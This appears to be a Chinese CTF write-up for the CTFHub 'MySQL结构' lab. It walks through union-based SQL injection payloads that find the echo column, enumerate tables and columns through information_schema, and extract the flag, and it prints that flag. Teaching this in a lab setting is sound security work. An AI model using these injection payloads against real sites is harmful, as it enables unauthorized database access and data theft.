MySQL结构 - CTFHub Web 入门 Writeup

2026年9月18日 CTFHub Web安全 SQL注入 联合查询

这道题叫“MySQL结构”，一开始我完全不知道是什么意思。经历了环境过期、随机表名、语法写错等折磨后，我终于搞懂了：**所谓“MySQL结构”，就是让你去查数据库的“户口本”，摸清库里有哪些表、表里有哪些列，最后顺藤摸瓜拿到数据。**

一、题目原理与核心概念（大白话解释）

1. 什么是“MySQL结构”？ MySQL 数据库就像一个“档案馆”，有总库、表、列。这道题不让你直接拿数据，而是让你通过注入，一步步把表名、列名查出来，这就是查“结构”。

2. 核心方法论：联合查询注入。利用 union select 强行把我们要查的内容，拼接到页面上原本显示 Data 的位置。

3. 关键概念“回显位”。页面哪一列能被我们控制、能显示查询结果，它就是我们的“话筒”。

二、保姆级解题步骤（每一行代码都在干什么）

⚠️ 核心提示：输入框可能有限制，如果报错，请在浏览器地址栏直接拼接 URL（将空格替换为 +）。

第 1 步：测出“话筒”在哪一列（测试回显位）

输入：

1 union select 1, 2

运行结果： 页面显示 ID: 1 和 Data: ctfhub（显示的是原本查到的数据，不是我们注入的 2）。

代码逐字翻译：

  • 1：让数据库先查 id=1 的内容。
  • union：联合查询，意思是“除了前面查到的，我强行再追加一条我指定的查询”。
  • select 1, 2：强行追加一条只有 1 和 2 的结果。

为什么没显示 2？ 因为数据库优先返回了 id=1 的真实数据。

破局关键： 改用 -1 让前面的查询查不到东西。

输入：

-1 union select 1, 2

运行结果： 页面显示 ID: 1 和 Data: 2。

结论： 第二列（Data）就是我们的“话筒”（回显位）！ 我们可以把要查的东西放在第二个位置。

第 2 步：查数据库里有哪些表（查表名）

输入：

-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema=database()

运行结果： 页面 Data: 后面显示类似 news,xxrqumkstl 的字符串。

代码逐字翻译：

  • -1 union select 1, 2：老规矩，抢过话筒。
  • group_concat(table_name)：把查到的所有表名，用逗号拼成一行（因为页面只能显示一行数据）。
  • from information_schema.tables：从系统自带的“表名档案室”里查。
  • where table_schema=database()：条件限制为“当前所在的数据库”。

踩坑提醒： 这里的 xxrqumkstl 是系统**随机生成**的表名，每次开启新环境都会变！必须用这一步查出来的真实表名，不能瞎猜。

第 3 步：查这张表里有哪些列（查列名）——【你踩坑的地方】

错误示范： 输入 ...where table_name='xxrqumkstl,news'，页面 Data: 变成空白。

原因分析： 数据库中根本没有叫 `xxrqumkstl,news` 的“连体婴”表。SQL 语法中，table_name 只能等于**一个**确定的表名。

正确输入：

-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='xxrqumkstl'

代码逐字翻译：

  • group_concat(column_name)：把查到的列名拼成一行。
  • from information_schema.columns：去系统自带的“列名登记册”里查。
  • where table_name='xxrqumkstl'：限定条件是“这张叫 xxrqumkstl 的表”。

运行结果： 页面显示类似 id,data 或 id,flag。记下这个列名（假设是 data）。

第 4 步：一击致命，提取 Flag（查数据）

输入：

-1 union select 1, data from xxrqumkstl

代码翻译： 去 xxrqumkstl 这张表里，把 data 这一列的内容掏出来。

最终 Flag： ctfhub{222ff04a94d5f427ff2b2172}

三、踩坑启示录

💡 不要用脚本死磕环境： CTFHub 环境极易过期，导致脚本跑一半断掉（比如上次跑出 `có` 或 `ctfhub` 就停下）。手工利用回显位注入反而最快。

💡 随机表名是陷阱： 题目故意把表名设成 `xxrqumkstl` 这种随机字符串，逼迫你必须用 `information_schema` 去查结构，不能瞎猜。

💡 语法细节决定成败： 查列名时，`table_name` 后面只能跟一个表名。混入逗号会导致 SQL 语法错误，返回空白。
